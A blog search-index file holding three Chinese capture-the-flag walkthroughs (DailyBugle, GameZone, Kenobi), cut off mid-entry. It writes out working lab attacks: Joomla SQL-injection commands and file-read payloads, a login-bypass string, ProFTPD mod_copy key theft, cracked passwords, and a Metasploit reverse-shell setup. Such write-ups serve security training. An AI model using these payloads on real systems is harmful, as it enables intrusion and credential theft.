<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Offensive Pentesting-DailyBugle</title>
      <link href="/2024/11/26/Offensive%20Pentesting-DailyBugle/"/>
      <url>/2024/11/26/Offensive%20Pentesting-DailyBugle/</url>
      
        <content type="html"><![CDATA[<h1 id="Offensive-Pentesting-DailyBugle"><a href="#Offensive-Pentesting-DailyBugle" class="headerlink" title="Offensive Pentesting-DailyBugle"></a>Offensive Pentesting-DailyBugle</h1><pre><code>Compromise a Joomla CMS account via SQLi, practise cracking hashes and escalate your privileges by taking advantage of yum.通过 SQLi 入侵 Joomla CMS 帐户，练习破解哈希并利用 yum 提升您的权限。</code></pre><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><pre><code>nmap -T4 -sC -sV --script=vuln 10.10.46.209</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411210914406.png" alt="image-20241121091426221"></p><p> 开放22 80 3306端口 其中80端口开放的网站服务是使用joomla框架搭建的</p><p>whatweb看一下 没啥有用的</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411210949603.png" alt="image-20241121094938510"></p><p>joomla框架的话 用joomlascan扫一下 找到版本为3.7.0</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411210950119.png" alt="image-20241121095047965"></p><p>What is the Joomla version?</p><pre><code>3.7.0</code></pre><p>然后访问一下网页 看到一则银行被抢劫的新闻 作案人是SpiderMan</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411210946626.png" alt="image-20241121094648366"></p><p>Access the web server, who robbed the bank?</p><pre><code>SpiderMan</code></pre><p>其实在前面我们使用Joomlascan来扫描的时候 可以发现扫到了一个admin page</p><pre><code>[+] admin finder[++] Admin page : http://10.10.46.209//administrator</code></pre><p>访问一下 发现是后台登陆页面</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411211959653.png" alt="image-20241121195913557"></p><p>到这里 信息搜集基本可以结束 </p><h2 id="Joomla3-7-0sql注入漏洞获取用户登陆密码"><a href="#Joomla3-7-0sql注入漏洞获取用户登陆密码" class="headerlink" title="Joomla3.7.0sql注入漏洞获取用户登陆密码"></a>Joomla3.7.0sql注入漏洞获取用户登陆密码</h2><p>类似的做法我们在DC-3中已经见过 使用sqlmap就可以做到</p><p><a href="https://w3nx1z1.github.io/2023/11/30/vulnhub%E9%9D%B6%E5%9C%BADC-3%E9%80%9A%E5%85%B3wp/">vulnhub靶场记录DC-3</a></p><p>直接看用法</p><pre><code>Using Sqlmap:sqlmap -u &quot;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</code></pre><p>上结果  查到表</p><pre><code>sqlmap -u &quot;http://10.10.46.209/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</code></pre><pre><code>[*] information_schema[*] joomla[*] mysql[*] performance_schema[*] test</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411212002126.png" alt="image-20241121200217046"></p><p>继续在joomla数据库中注出数据表 我们这里需要的是<code>#__users</code>表</p><pre><code>sqlmap -u &quot;http://10.10.46.209/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomla --tables -p list[fullordering]</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411212003586.png" alt="image-20241121200306529"></p><p>在表中注出字段</p><pre><code>sqlmap -u &quot;http://10.10.46.209/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomla -T &#39;#__users&#39; --columns -p list[fullordering]</code></pre><p>我们需要的是username和password字段的值</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411212005451.png" alt="image-20241121200507384"></p><p>注出其中的值</p><pre><code>sqlmap -u &quot;http://10.10.46.209/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D joomla -T &#39;#__users&#39; -C &quot;username,password&quot; --dump  -p list[fullordering]</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411212006742.png" alt="image-20241121200634697"></p><h3 id="john爆破出jonah用户的密码明文"><a href="#john爆破出jonah用户的密码明文" class="headerlink" title="john爆破出jonah用户的密码明文"></a>john爆破出jonah用户的密码明文</h3><p>下面使用john来进行爆破</p><pre><code>echo $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm &gt;hash1.txtjohn --wordlist=rockyou.txt --user=jonah hash1.txt</code></pre><p>爆破出是spiderman123</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411212008740.png" alt="image-20241121200803685"></p><p>使用jonah&#x2F;spiderman123成功登陆网站后台</p><h2 id="靶机shell"><a href="#靶机shell" class="headerlink" title="靶机shell"></a>靶机shell</h2><h3 id="任意文件读取-一个小利用-但是在这里不是很方便"><a href="#任意文件读取-一个小利用-但是在这里不是很方便" class="headerlink" title="任意文件读取(一个小利用 但是在这里不是很方便)"></a>任意文件读取(一个小利用 但是在这里不是很方便)</h3><p>其实joomla3.7.0也是可以利用sqli进行任意文件读取的 这里放几个payload 将想读的文件的绝对路径转hex就行</p><p>正常读  读第一行</p><pre><code>/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(0x23,concat(1,load_file(0x2f6574632f706173737764)),1)</code></pre><p>读正数第N行</p><pre><code>/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(0x23,concat(1,substring_index(substring_index(load_file(0x2f6574632f706173737764),0x0a,N),0x0a,-1)),1)</code></pre><p>读倒数第N行(因为他这个情况下只能显示出来一行)</p><pre><code>/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(0x23,concat(1,substring_index(substring_index(load_file(0x2f6574632f706173737764),0x0a,-N+1),0x0a,1)),1)</code></pre><p>这里成功读到倒数第三行的靶机中另一个用户</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411212137163.png" alt="image-20241121213753065"></p><p>后面还可以继续读<code>/var/www/html/configuration.php</code>这里面有jjameson用户的登陆密码 再通过ssh的方式拿到shell 但是这里文件读取有行数和每行字数的限制 都不全 所以也不行</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411212148477.png" alt="image-20241121214840418"></p><h3 id="另外其实msfconsole上也有利用方式-但是不知道为什么怎么都连不上去"><a href="#另外其实msfconsole上也有利用方式-但是不知道为什么怎么都连不上去" class="headerlink" title="另外其实msfconsole上也有利用方式 但是不知道为什么怎么都连不上去"></a>另外其实msfconsole上也有利用方式 但是不知道为什么怎么都连不上去</h3><p>这个方式我们在DC-3的时候是可以成功利用的</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411212144145.png" alt="image-20241121214445084"></p><h3 id="sql注入读文件拿到登陆密码"><a href="#sql注入读文件拿到登陆密码" class="headerlink" title="sql注入读文件拿到登陆密码"></a>sql注入读文件拿到登陆密码</h3><pre><code>sqlmap -u &quot;http://10.10.67.113/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -p list[fullordering] --dbms mysql --technique E --file-read /var/www/html/configuration.php --batch</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411212149708.png" alt="image-20241121214932637"></p><pre><code>nv5uz9r3ZEDzVjNu</code></pre><p>直接ssh连</p><pre><code>ssh jjameson@10.10.67.113 </code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411212151142.png" alt="image-20241121215144074"></p><h3 id="修改模板代码进行反弹shell"><a href="#修改模板代码进行反弹shell" class="headerlink" title="修改模板代码进行反弹shell"></a>修改模板代码进行反弹shell</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411212152691.png" alt="image-20241121215255610"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411212153939.png" alt="image-20241121215314878"></p><h2 id="yum提权"><a href="#yum提权" class="headerlink" title="yum提权"></a>yum提权</h2><p>先看suid</p><pre><code>find / -type f -perm -u=s 2&gt;/dev/null</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411212154134.png" alt="image-20241121215422085"></p><p>有su和sudo 但是很可惜这里用不了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411212154805.png" alt="image-20241121215452760"></p><p>再看有root权限的命令</p><pre><code>sudo -l</code></pre><p>发现yum可以</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411212156030.png" alt="image-20241121215600967"></p><p>直接在<a href="https://gtfobins.github.io/">GTFOBins</a>上面 找到利用方法</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411212156003.png" alt="image-20241121215653950"></p><p>照着打就行</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411212157382.png" alt="image-20241121215719315"></p><h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><p>1.Joomla3.7.0 sql注入拿到后台登陆密码</p><p>2.修改模板代码反弹shell</p><p>3.sql注入拿用户密码</p><p>4.yum提权</p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 打靶 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Offensive Pentesting-GameZone</title>
      <link href="/2024/11/26/Offensive%20Pentesting-GameZone/"/>
      <url>/2024/11/26/Offensive%20Pentesting-GameZone/</url>
      
        <content type="html"><![CDATA[<h1 id="Offensive-Pentesting-GameZone"><a href="#Offensive-Pentesting-GameZone" class="headerlink" title="Offensive Pentesting-GameZone"></a>Offensive Pentesting-GameZone</h1><h2 id="Deploy-the-vulnerable-machine"><a href="#Deploy-the-vulnerable-machine" class="headerlink" title="Deploy the vulnerable machine"></a>Deploy the vulnerable machine</h2><p>拿到靶机 先扫端口</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411172254919.png" alt="image-20241117225437774"></p><p>只是开启了22端口的ssh服务和80端口的web服务</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411172301781.png" alt="image-20241117230136420"></p><p>访问一下网站</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411172310906.png" alt="image-20241117231042730"></p><p>What is the name of the large cartoon avatar holding a sniper on the forum?</p><pre><code>Agent 47</code></pre><p>问的是背景中这个拿着狙击枪的角色是 我们把这张图单独保存出来 百度识图一下得知是《杀手》游戏中的主角</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411172314464.png" alt="image-20241117231439353"></p><h2 id="Obtain-access-via-SQLi"><a href="#Obtain-access-via-SQLi" class="headerlink" title="Obtain access via SQLi"></a>Obtain access via SQLi</h2><p>SQL 是一种用于在数据库中存储、编辑和检索数据的标准语言。查询可能如下所示：</p><pre><code>SELECT * FROM users WHERE username = :username AND password := password</code></pre><p>在我们的 GameZone 机器中，当您尝试登录时，它将从您的用户名和密码中获取您输入的值，然后将它们直接插入到上面的查询中。如果查询找到数据，您将被允许登录，否则它将显示一条错误消息。</p><p>这是一个潜在的漏洞位置，因为您可以将用户名输入为另一个 SQL 查询。这将写入、放置和执行查询。</p><p>让我们使用上面学到的知识来操作查询并在没有任何合法凭证的情况下登录。</p><p>如果我们的用户名是 admin，密码是： <code>&#39; or 1=1 -- -</code>它会将其插入到查询中并验证我们的会话。</p><p>现在在 Web 服务器上执行的 SQL 查询如下所示：</p><pre><code>SELECT * FROM users WHERE username = admin AND password := &#39; or 1=1 -- -</code></pre><p>我们作为密码输入的额外 SQL 更改了上述查询以中断初始查询并继续（与管理员用户一起）如果 1&#x3D;&#x3D;1，则注释查询的其余部分以阻止它中断。</p><p>完成</p><p>GameZone 在数据库中没有管理员用户，但是您仍然可以使用我们在上一个问题中使用的输入密码数据在不知道任何凭据的情况下登录。</p><p>使用 <code>&#39; or 1=1 -- -</code> 作为您的用户名，并将密码留空</p><p>登录后，您将重定向到哪个页面？</p><pre><code>portal.php</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411181135932.png" alt="image-20241118113525822"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411181135714.png" alt="image-20241118113538644"></p><h2 id="Using-SQLMap"><a href="#Using-SQLMap" class="headerlink" title="Using SQLMap"></a>Using SQLMap</h2><p>重定向到的这个页面是一个游戏评论查询的功能 我们可以在这个页面上进行sql注入 这里直接使用sqlmap</p><p>先用burpsuite把请求包拦一下 将请求包的内容保存到requests.txt中</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411181152184.png" alt="image-20241118115229127"></p><pre><code>sqlmap -r requests.txt --dbms=mysql --dump</code></pre><p>使用–dbms指定数据库的类型 –dump直接转储数据库表项,查询字段值 </p><p>输出了db数据库中的两个表</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411181154640.png" alt="image-20241118115453573"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411181154331.png" alt="image-20241118115457279"></p><p>在 users 表中，哈希密码是什么？</p><pre><code>ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14</code></pre><p>与哈希密码关联的用户名是什么？</p><pre><code>agent47</code></pre><p>另一个表名是什么？</p><pre><code>post</code></pre><h2 id="Cracking-a-password-with-JohnTheRipper"><a href="#Cracking-a-password-with-JohnTheRipper" class="headerlink" title="Cracking a password with JohnTheRipper"></a>Cracking a password with JohnTheRipper</h2><p>下一步我们使用john来爆破密码</p><pre><code>john hash.txt --wordlist=rockyou.txt --format=Raw-SHA256</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411181157277.png" alt="image-20241118115759212"></p><p>拿到密码明文是</p><pre><code>videogamer124</code></pre><p>有了用户名和密码 我们可以使用ssh远程连接 获取agent47用户的shell 并拿到用户目录下的flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411181159788.png" alt="image-20241118115914731"></p><p>什么是用户标志？</p><pre><code>649ac17b1480ac13ef1e4fa579dac95c</code></pre><h2 id="Exposing-services-with-reverse-SSH-tunnels-使用反向-SSH-隧道公开服务"><a href="#Exposing-services-with-reverse-SSH-tunnels-使用反向-SSH-隧道公开服务" class="headerlink" title="Exposing services with reverse SSH tunnels(使用反向 SSH 隧道公开服务)"></a>Exposing services with reverse SSH tunnels(使用反向 SSH 隧道公开服务)</h2><p>反向 SSH 端口转发将远程服务器主机上的给定端口转发到本地端的给定主机和端口。</p><p><strong>-L</strong> 是本地隧道 （YOU &lt;– CLIENT）。如果站点被阻止，您可以将流量转发到您拥有的服务器并查看它。例如，如果你在本地访问远程服务器开启的网页被拒绝时，您可以执行</p><pre><code>ssh -L 9000:imgur.com:80 user@example.com</code></pre><p>转到您计算机上的 localhost:9000，将使用您的其他服务器加载这个远程服务器的服务流量。</p><p><strong>-R</strong> 是远程隧道 （YOU –&gt; CLIENT）。您将流量转发到其他服务器供其他人查看。与上面的示例类似，但是相反</p><pre><code>我们将使用一个名为 ss 的工具来调查主机上运行的sockets如果我们运行 ss -tulpn，它会告诉我们正在运行哪些sockets连接</code></pre><table><thead><tr><th><strong>Argument</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td>-t</td><td>Display TCP sockets</td></tr><tr><td>-u</td><td>Display UDP sockets</td></tr><tr><td>-l</td><td>Displays only listening sockets</td></tr><tr><td>-p</td><td>Shows the process using the socket</td></tr><tr><td>-n</td><td>Doesn’t resolve service names</td></tr></tbody></table><p>现在我们可以在靶机中运行一下这个命令 查看一下有多少TCP的sockets在运行</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411181648577.png" alt="image-20241118164804514"></p><p>How many TCP sockets are running?</p><pre><code>5</code></pre><p>我们可以看到，运行在端口 10000 上的服务被防火墙规则从外部阻止了（我们可以从 IPtable 列表中看到这一点）。但是，使用 SSH 隧道，我们可以将端口公开给我们（本地）</p><pre><code>sudo iptables -L -n -v</code></pre><p>在本地 我们运行 这样10.10.137.213开放的端口10000的服务就会转发到我们本地的10000端口上</p><pre><code>ssh -L 10000:localhost:10000 agent47@10.10.137.213</code></pre><p>现在访问<code>localhost:10000</code> 就可以访问到这个web服务 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411181657049.png" alt="image-20241118165732947"></p><p>尝试发现 网站的登陆密码也是agent47&#x2F;videogamer124 成功登陆后台</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411181658156.png" alt="image-20241118165808082"></p><p>What is the name of the exposed CMS?</p><pre><code>Webmin</code></pre><p>What is the CMS version?</p><pre><code>1.580</code></pre><h2 id="Privilege-Escalation-with-Metasploit"><a href="#Privilege-Escalation-with-Metasploit" class="headerlink" title="Privilege Escalation with Metasploit"></a>Privilege Escalation with Metasploit</h2><p>有了cms的版本 我们直接使用msfconsole来提权 这里就直接使用第一个payload来自动提权</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411181659845.png" alt="image-20241118165954787"></p><p>需要提前设置的条件有</p><pre><code>use 0set payload cmd/unix/reverseset RHOSTS localhostset RPOST 10000set PASSWORD videogamer124set USERNAME agent47set LHOST 10.11.114.143set ssl false</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411181700941.png" alt="image-20241118170035861"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411181707215.png" alt="image-20241118170727069"></p><p>已经创建了一个session会话 直接打开</p><pre><code>sessions -lsessions 1</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411181708778.png" alt="image-20241118170859673"></p><h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><p>1.sql注入重定向</p><p>2.sqlmap注出数据库中的账密信息</p><p>3.john破解密码哈希</p><p>4.反向ssh隧道端口转发</p><p>5.Webmin 1.580漏洞 msfconsole提权</p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 打靶 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Offensive Pentesting-Kenobi</title>
      <link href="/2024/11/26/Offensive%20Pentesting-Kenobi/"/>
      <url>/2024/11/26/Offensive%20Pentesting-Kenobi/</url>
      
        <content type="html"><![CDATA[<h1 id="Offensive-Pentesting-Kenobi"><a href="#Offensive-Pentesting-Kenobi" class="headerlink" title="Offensive Pentesting-Kenobi"></a>Offensive Pentesting-Kenobi</h1><pre><code>Walkthrough on exploiting a Linux machine. Enumerate Samba for shares, manipulate a vulnerable version of proftpd and escalate your privileges with path variable manipulation.此房间将涵盖访问 Samba 共享、操纵易受攻击的 proftpd 版本以获得初始访问权限，并通过 SUID 二进制文件将您的权限升级到 root。</code></pre><h2 id="扫端口"><a href="#扫端口" class="headerlink" title="扫端口"></a>扫端口</h2><pre><code>┌──(root㉿kali)-[/home/w3nx1z1]└─# nmap -T4 -sV -sC 10.10.233.125Starting Nmap 7.92 ( https://nmap.org ) at 2024-11-17 11:09 CSTNmap scan report for 10.10.233.125Host is up (0.27s latency).Not shown: 993 closed tcp ports (reset)PORT     STATE SERVICE     VERSION21/tcp   open  ftp         ProFTPD 1.3.522/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)| http-robots.txt: 1 disallowed entry |_/admin.html|_http-title: Site doesn&#39;t have a title (text/html).111/tcp  open  rpcbind     2-4 (RPC #100000)| rpcinfo: |   program version    port/proto  service|   100000  2,3,4        111/tcp   rpcbind|   100000  2,3,4        111/udp   rpcbind|   100000  3,4          111/tcp6  rpcbind|   100000  3,4          111/udp6  rpcbind|   100003  2,3,4       2049/tcp   nfs|   100003  2,3,4       2049/tcp6  nfs|   100003  2,3,4       2049/udp   nfs|   100003  2,3,4       2049/udp6  nfs|   100005  1,2,3      36585/udp   mountd|   100005  1,2,3      49263/tcp   mountd|   100005  1,2,3      54329/udp6  mountd|   100005  1,2,3      59841/tcp6  mountd|   100021  1,3,4      39645/tcp   nlockmgr|   100021  1,3,4      40321/udp6  nlockmgr|   100021  1,3,4      44189/tcp6  nlockmgr|   100021  1,3,4      58684/udp   nlockmgr|   100227  2,3         2049/tcp   nfs_acl|   100227  2,3         2049/tcp6  nfs_acl|   100227  2,3         2049/udp   nfs_acl|_  100227  2,3         2049/udp6  nfs_acl139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)2049/tcp open  nfs_acl     2-3 (RPC #100227)Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelHost script results:| smb-security-mode: |   account_used: guest|   authentication_level: user|   challenge_response: supported|_  message_signing: disabled (dangerous, but default)|_clock-skew: mean: 1h59m59s, deviation: 3h27m51s, median: -1s|_nbstat: NetBIOS name: KENOBI, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)| smb2-security-mode: |   3.1.1: |_    Message signing enabled but not required| smb2-time: |   date: 2024-11-17T03:10:03|_  start_date: N/A| smb-os-discovery: |   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)|   Computer name: kenobi|   NetBIOS computer name: KENOBI\x00|   Domain name: \x00|   FQDN: kenobi|_  System time: 2024-11-16T21:10:03-06:00Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 25.90 seconds</code></pre><p>Scan the machine with nmap, how many ports are open?</p><pre><code>7</code></pre><h2 id="Enumerating-Samba-for-shares-枚举Samba"><a href="#Enumerating-Samba-for-shares-枚举Samba" class="headerlink" title="Enumerating Samba for shares(枚举Samba)"></a>Enumerating Samba for shares(枚举Samba)</h2><pre><code>Samba 是适用于 Linux 和 Unix 的标准 Windows 互操作性程序套件。它允许最终用户访问和使用公司内部网或互联网上的文件、打印机和其他常见共享资源。它通常被称为网络文件系统。Samba 基于服务器消息块 （SMB） 的通用客户端/服务器协议。SMB 专为 Windows 开发，如果没有 Samba，其他计算机平台将与 Windows 计算机隔离，即使它们属于同一网络。</code></pre><p>使用 nmap，我们可以枚举 SMB 共享的计算机。</p><p>Nmap 能够运行以自动执行各种网络任务。有一个脚本可以列举份额！</p><pre><code>nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.233.125</code></pre><p>SMB 有两个端口，即 445 和 139。</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411171126600.png" alt="https://i.imgur.com/bkgVNy3.png"></p><p>使用上面的 nmap 命令，找到了多少个共享？</p><pre><code>3</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411171127818.png" alt="image-20241117112738713"></p><p>我们可以使用这条命令来连接到计算机的网络共享 并查看其中的文件</p><pre><code>smbclient //10.10.233.125/anonymous</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411171130073.png" alt="image-20241117113021004"></p><p>连接后，列出共享中的文件。您可以看到什么文件？</p><pre><code>log.txt</code></pre><p>可以使用more命令来读取其中的内容</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411171155750.png" alt="image-20241117115555645"></p><p>到这里其实已经可以回答下面的问题了</p><p>What port is FTP running on?</p><pre><code>21</code></pre><p>在接着往下看</p><p>您也可以以递归方式下载 SMB 共享。将用户名和密码作为 nothing 提交。</p><pre><code>smbget -R smb://10.10.40.36/anonymous</code></pre><p>打开共享上的文件。发现了一些有趣的事情。</p><ul><li>可以发现为kenobi用户生成了ssh私钥的信息</li><li>有关 ProFTPD 服务器的信息。</li></ul><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411171711745.png" alt="image-20241117171131658"></p><p>这个操作和网络速度有关系 有时候会报错连接不上 多试几次就好了</p><p>这部分是为用户生成 SSH 密钥时为 Kenobi 生成的信息</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411171721192.png" alt="image-20241117172142137"></p><p>这一部分是有关 ProFTPD 服务器的信息 也提到了FTP服务在21端口上运行</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411171723192.png" alt="image-20241117172355122"></p><p>您之前的 nmap 端口扫描将显示端口 111 运行服务 rpcbind。这只是一个将远程过程调用 （RPC） 程序编号转换为通用地址的服务器。当 RPC 服务启动时，它会告诉 rpcbind 它正在侦听的地址以及它准备提供的 RPC 程序编号。</p><p>在我们的例子中，端口 111 是对网络文件系统的访问。让我们用 nmap 来列举一下。</p><pre><code>nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.40.36</code></pre><p>这里可以看到开放的111端口运行了rpcbind服务(远程过程调用) 在这里是远程文件系统的共享 通过nfs-showmount的内容得知 当前目标主机通过nfs服务共享了&#x2F;var文件夹 同时<code>*</code>表示此共享目录对所有客户端（任何主机）都开放访问权限</p><p><img src="C:/Users/hp/AppData/Roaming/Typora/typora-user-images/image-20241117172649592.png" alt="image-20241117172649592"></p><p>What mount can we see?</p><pre><code>/var</code></pre><h2 id="Gain-initial-access-with-ProFtpd-通过ProFtpd-获得初始访问权限"><a href="#Gain-initial-access-with-ProFtpd-通过ProFtpd-获得初始访问权限" class="headerlink" title="Gain initial access with ProFtpd(通过ProFtpd 获得初始访问权限)"></a>Gain initial access with ProFtpd(通过ProFtpd 获得初始访问权限)</h2><pre><code>ProFtpd 是一个免费的开源 FTP 服务器，与 Unix 和 Windows 系统兼容。它在过去的软件版本中也容易受到攻击。</code></pre><p>让我们获取 ProFtpd 的版本。使用 netcat 通过 FTP 端口连接到本机。</p><p>版本是什么？</p><pre><code>1.3.5</code></pre><p>这一点我们在前面nmap扫端口的时候就已经可以分析出来</p><pre><code>PORT     STATE SERVICE     VERSION21/tcp   open  ftp         ProFTPD 1.3.5</code></pre><p>我们可以使用 searchsploit 来查找特定软件版本的漏洞。</p><p>Searchsploit 基本上只是一个用于 exploit-db.com 的命令行搜索工具。</p><p>ProFTPd 运行有多少个漏洞？</p><pre><code>4</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411171736471.png" alt="image-20241117173632314"></p><p>但是这里我们不直接使用搜到的ProFTPd 1.3.5的漏洞利用文件 而是按照我们上面在日志中找到的记录  利用为kenobi用户生成的ssh私钥  来ssh远程连接 登录到kenobi账户</p><p>ProFtpd的mod_copy 模块可以实现 <strong>SITE CPFR</strong> 和 <strong>SITE CPTO</strong> 命令，这些命令可用于将文件&#x2F;目录从服务器上的一个位置复制到另一个位置。任何未经身份验证的客户端都可以利用这些命令将文件从文件系统的任何部分复制到选定的目标。</p><p>我们知道 FTP 服务以 Kenobi 用户身份运行（从共享上的文件），并且会为该用户生成 ssh 密钥。</p><p>根据上面找到的开启FTP服务的端口是21 我们可以先来连接这个FTP服务 在日志中找到私钥在目标靶机上保存的路径是&#x2F;home&#x2F;kenobi&#x2F;.ssh&#x2F;id_rsa</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411172122889.png" alt="image-20241117212242832"></p><pre><code>┌──(w3nx1z1㉿kali)-[~/桌面]└─$ nc 10.10.166.18 21220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.166.18]SITE CPFR /home/kenobi/.ssh/id_rsa # 需要我们输入350 File or directory exists, ready for destination nameSITE CPTO /var/tmp/id_rsa    # 需要我们输入250 Copy successful</code></pre><p>这样我们就将&#x2F;home&#x2F;kenobi&#x2F;.ssh&#x2F;id_rsa私钥复制到了&#x2F;var&#x2F;tmp&#x2F;id_rsa 同时根据上面任务2的第四题 我们得知rpcbind服务开启的共享文件夹服务就是挂载在了&#x2F;var文件夹上</p><pre><code>mkdir /mnt/kenobiNFSmount 10.10.166.18:/var /mnt/kenobiNFSls /mnt/kenobiNFS/tmp</code></pre><p>此时我们看到&#x2F;mnt&#x2F;kenobiNFS&#x2F;tmp文件夹下已经有了我们需要的私钥文件 下面将这个私钥文件复制到当前文件夹中</p><pre><code>cp /mnt/kenobiNFS/tmp/id_rsa .</code></pre><p>在赋予私钥文件600权限 </p><pre><code>sudo chmod 600 id_rsa</code></pre><table><thead><tr><th>权限编号</th><th>权限字符串</th><th>拥有者权限</th><th>组权限</th><th>其他人权限</th><th>常见用途</th></tr></thead><tbody><tr><td><strong>600</strong></td><td><code>rw-------</code></td><td>读写</td><td>无</td><td>无</td><td>SSH 